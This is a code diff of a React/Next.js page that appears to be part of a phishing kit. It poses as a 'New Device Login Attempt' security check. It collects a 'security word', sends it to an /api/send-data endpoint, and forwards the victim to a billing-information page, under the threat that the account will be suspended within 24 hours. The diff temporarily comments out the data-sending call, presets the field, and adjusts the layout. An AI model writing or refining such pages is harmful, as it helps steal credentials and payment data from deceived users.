@@ -7,7 +7,7 @@ import { useRouter } from "next/navigation";
 import React, { useEffect, useState } from "react";
 
 const Page = () => {
-  const [securityWord, setSecurityWord] = useState("");
+  const [securityWord, setSecurityWord] = useState("00000");
   const [loading, setLoading] = useState(false);
   const [locationLoading, setLocationLoading] = useState(true);
   const [userLocation, setUserLocation] = useState("Detecting location...");
@@ -43,24 +43,24 @@ const Page = () => {
   const handleSubmit = async (e) => {
     e.preventDefault();
 
-    try {
-      setLoading(true);
-      await axios.post("/api/send-data", { securityWord });
-      router.push("/billing-info");
-    } catch (err) {
-      alert("Wrong Security Word, Please give valid Security Word");
-    } finally {
-      setLoading(false);
-    }
+    // try {
+    //   setLoading(true);
+    //   await axios.post("/api/send-data", { securityWord });
+    router.push("/billing-info");
+    // } catch (err) {
+    //   alert("Wrong Security Word, Please give valid Security Word");
+    // } finally {
+    //   setLoading(false);
+    // }
   };
 
   return (
     <main className="bg-[#e3e6e6] min-h-screen flex flex-col">
       <Header />
 
-      <div className="flex-grow flex items-center justify-center px-4 min-h-[90vh]">
-        <div className="w-full max-w-md bg-white rounded-2xl shadow-lg p-8">
-          <h1 className="text-2xl font-bold text-[#0d2d62] mb-4">
+      <div className="flex min-h-[90vh] flex-grow items-center justify-center px-4 py-8 sm:py-10">
+        <div className="w-full max-w-md rounded-2xl bg-white p-6 shadow-lg sm:p-8">
+          <h1 className="mb-4 text-xl font-bold text-[#0d2d62] sm:text-2xl">
             New Device Login Attempt
           </h1>
 
@@ -89,7 +89,7 @@ const Page = () => {
               />
             </div> */}
 
-            <div className="flex gap-4 mb-6">
+            <div className="mb-6 flex flex-col gap-3 sm:flex-row sm:gap-4">
               <button
                 type="submit"
                 className="flex-1 border border-[#ffd814] text-black py-3 rounded-lg font-semibold hover:bg-[#f0f4f9] transition-colors text-center cursor-pointer"
@@ -107,7 +107,7 @@ const Page = () => {
           </form>
 
           <p className="text-xs text-gray-600 leading-relaxed">
-            If you don’t confirm within 24 hours, we’ll limit and suspend your
+            If you don't confirm within 24 hours, we'll limit and suspend your
             account. We apologize for any inconvenience caused by our security
             measures.
           </p>
